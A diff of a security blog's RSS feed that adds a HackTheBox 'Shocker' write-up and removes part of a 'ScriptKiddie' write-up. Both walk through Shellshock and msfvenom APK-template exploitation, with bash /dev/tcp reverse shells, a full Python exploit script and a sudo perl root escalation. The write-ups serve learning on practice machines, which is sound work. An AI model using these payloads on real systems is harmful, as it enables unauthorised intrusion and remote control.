@@ -5,7 +5,247 @@
     <link>https://fahmifj.github.io/tags/sudo/</link>
     <description>Recent content in sudo on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 02 Jul 2021 22:08:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Jul 2021 11:30:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Shocker</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
+      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
+      <description>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
+In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
+Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
+      <content:encoded><![CDATA[<p>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
+<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Shellshock vulnerability</li>
+<li>Exploitation of sudo privileges on perl</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Gobuster</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 20:24 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.00 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The site serves only one a text and an image.</p>
+<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
+</p>
+<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -I http://10.10.10.56
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">11</span> Jul <span style="color:#ae81ff">2021</span> 00:49:51 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Last-Modified: Fri, <span style="color:#ae81ff">22</span> Sep <span style="color:#ae81ff">2017</span> 20:01:19 GMT
+ETag: <span style="color:#e6db74">&#34;89-559ccac257884&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span style="color:#ae81ff">137</span>
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 20:26:07 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 294]
+/icons/               (Status: 403) [Size: 292]
+...[SNIP]...
+</code></pre><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/cgi-bin
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi,sh
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 21:43:04 Starting gobuster in directory enumeration mode
+===============================================================
+/user.sh              (Status: 200) [Size: 125]
+...[SNIP]...
+</code></pre><p>The <code>script.sh</code> returns the following contents.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -s http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 21:46:09 up <span style="color:#ae81ff">1</span> day, 20:28,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.00
+
+</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-shelly">Shell as shelly</h3>
+<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
+<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
+<p>The following is the commonly used PoC for shellshock.</p>
+<pre><code>(){:}; echo; &lt;bash command&gt;
+</code></pre><p>The PoC works on <code>User-Agent</code> header.</p>
+<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
+</p>
+<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
+<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
+<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
+</p>
+<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
+<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
+</p>
+<p>The following bash reverse shell works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; echo; echo <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> | /bin/bash
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
+</p>
+<h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ export TERM<span style="color:#f92672">=</span>xterm
+export TERM<span style="color:#f92672">=</span>xterm
+shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
+script /dev/null -c bash
+Script started, file is /dev/null
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> suspended  nc -nvlp <span style="color:#ae81ff">53</span>
+→ kali@kali «shocker» «10.10.14.83» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> continued  nc -nvlp <span style="color:#ae81ff">53</span>
+
+shelly@Shocker:/usr/lib/cgi-bin$  
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> shelly shelly <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">10</span> 03:31 test
+-r--r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">9</span> 01:17 user.txt
+shelly@Shocker:/home/shelly$ cat user.txt 
+7ac9eb73e6cb...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User shelly may run the following commands on Shocker:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
+<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+root@Shocker:/home/shelly# id <span style="color:#f92672">&amp;&amp;</span> hostname
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+Shocker
+root@Shocker:/home/shelly#
+</code></pre></div><p>The root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
+e3689b13acb2...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="extras">Extras</h2>
+<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
+<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
+<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# echo -e <span style="color:#e6db74">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
+root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
+</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
+<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
+</p>
+<p>The full response</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
+Date: Sun, 11 Jul 2021 03:06:31 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Connection: close
+Content-Type: text/x-sh
+Content-Length: 1113
+
+iamf
+test
+SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
+
+HTTP_USER_AGENT=Blackhole
+SERVER_PORT=80
+HTTP_HOST=10.10.10.56
+DOCUMENT_ROOT=/var/www/html
+SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
+REQUEST_URI=/cgi-bin/iamf.sh
+SCRIPT_NAME=/cgi-bin/iamf.sh
+HTTP_CONNECTION=close
+REMOTE_PORT=58222
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
+CONTEXT_PREFIX=/cgi-bin/
+PWD=/usr/lib/cgi-bin
+SERVER_ADMIN=webmaster@localhost
+REQUEST_SCHEME=http
+HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+REMOTE_ADDR=10.10.14.83
+SHLVL=1
+SERVER_NAME=10.10.10.56
+CONTENT_LENGTH=0
+SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
+QUERY_STRING=
+SERVER_ADDR=10.10.10.56
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_UPGRADE_INSECURE_REQUESTS=1
+SERVER_PROTOCOL=HTTP/1.1
+HTTP_CACHE_CONTROL=max-age=0
+HTTP_ACCEPT_ENCODING=gzip, deflate
+REQUEST_METHOD=GET
+CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
+HTTP_IAMF_HEADER=() {  :
+}
+_=/usr/bin/env
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>TryHackMe - rootme</title>
       <link>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</link>
@@ -1207,315 +1447,6 @@ $ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - ScriptKiddie</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</link>
-      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</guid>
-      <description>Exploiting exploitation tools</description>
-      <content:encoded><![CDATA[<p>ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privileges on <code>msfconsole</code>  can be leveraged to gain a root access.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Exploiting Metasploit CVE-2020-7384</li>
-<li>Log poisoning</li>
-<li>Exploiting sudo privileges</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Nmap</li>
-<li>CVE-2020-7384 <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">PoC</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
-$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:42 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
-Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">65533</span> closed ports
-Reason: <span style="color:#ae81ff">65533</span> resets
-PORT     STATE SERVICE REASON
-22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
-5000/tcp open  upnp    syn-ack ttl <span style="color:#ae81ff">63</span>
-
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 45.79 seconds
-</code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
-$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:44 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
-Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-5000/tcp open  http    Werkzeug httpd 0.16.1 <span style="color:#f92672">(</span>Python 3.8.5<span style="color:#f92672">)</span>
-|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
-|_http-title: k1d<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">5</span> h4ck3r t00l5
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.66 second
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
-<p>The site provides several online hacking tools.</p>
-<p><img class="img-container" src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  />
-</p>
-<p>The <code>nmap</code> tool can be used to scan against itself.</p>
-<p><img class="img-container" src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  />
-</p>
-<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused, but I&rsquo;ll note the <code>nmap</code> version.</p>
-<p>The next tool is <code>msfvenom</code>, it can be used to generate a reverse shell binary.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
-<p><img class="img-container" src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  />
-</p>
-<p>Somehow, it can only generate payload for Windows and Android.</p>
-<p><img class="img-container" src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  />
-</p>
-<p>The payload is available for 5 mins at <code>http://10.10.10.226:5000/static/payloads/[here]</code>.</p>
-<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returned this message.</p>
-<p><img class="img-container" src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  />
-</p>
-<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
-<p>I can&rsquo;t get the tools version except for <code>nmap</code>, so I searched some exploits around before the box release date (February 2021) on Exploit-DB  and here is what I found.</p>
-<p><img class="img-container" src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  />
-</p>
-<p>And that is probably what I need.</p>
-<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
-<p><img class="img-container" src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  />
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-kid">Shell as kid</h3>
-<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
-<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-<span style="color:#f92672">import</span> subprocess
-<span style="color:#f92672">import</span> tempfile
-<span style="color:#f92672">import</span> os
-<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32encode
-
-<span style="color:#75715e"># Change me</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>
-
-<span style="color:#75715e"># b32encode to avoid badchars (keytool is picky)</span>
-<span style="color:#75715e"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
-<span style="color:#75715e"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
-payload_b32 <span style="color:#f92672">=</span> b32encode(payload<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
-dname <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CN=&#39;|echo </span><span style="color:#e6db74">{</span>payload_b32<span style="color:#e6db74">}</span><span style="color:#e6db74"> | base32 -d | sh #&#34;</span>
-
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Manufacturing evil apkfile&#34;</span>)
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-dname: </span><span style="color:#e6db74">{</span>dname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-print()
-
-tmpdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./&#34;</span>
-apk_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;evil.apk&#34;</span>)
-empty_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;empty&#34;</span>)
-keystore_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;signing.keystore&#34;</span>)
-storepass <span style="color:#f92672">=</span> keypass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span>
-key_alias <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;signing.key&#34;</span>
-open(empty_file, <span style="color:#e6db74">&#34;w&#34;</span>)<span style="color:#f92672">.</span>close()
-subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;zip&#34;</span>, <span style="color:#e6db74">&#34;-j&#34;</span>, apk_file, empty_file])
-
-subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;keytool&#34;</span>, <span style="color:#e6db74">&#34;-genkey&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file, <span style="color:#e6db74">&#34;-alias&#34;</span>, key_alias, <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass,
-                       <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, <span style="color:#e6db74">&#34;-keyalg&#34;</span>, <span style="color:#e6db74">&#34;RSA&#34;</span>, <span style="color:#e6db74">&#34;-keysize&#34;</span>, <span style="color:#e6db74">&#34;2048&#34;</span>, <span style="color:#e6db74">&#34;-dname&#34;</span>, dname])
-subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;jarsigner&#34;</span>, <span style="color:#e6db74">&#34;-sigalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1withRSA&#34;</span>, <span style="color:#e6db74">&#34;-digestalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file,
-                       <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass, <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, apk_file, key_alias])
-print()
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Done! apkfile is at </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Do: msfvenom -x </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span>)
-</code></pre></div><p>It produces a file called <code>evil.apk</code> and it also shows the exploit commands.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ python3 exploit_msfvenom.py
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Manufacturing evil apkfile
-Payload: bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
--dname: CN<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">  adding: empty (stored 0%)
-</span><span style="color:#e6db74">jar signed.
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">Warning:
-</span><span style="color:#e6db74">The signer&#39;</span>s certificate is self-signed.
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Done! apkfile is at ./evil.apk
-Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>127.0.0.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -o /dev/null
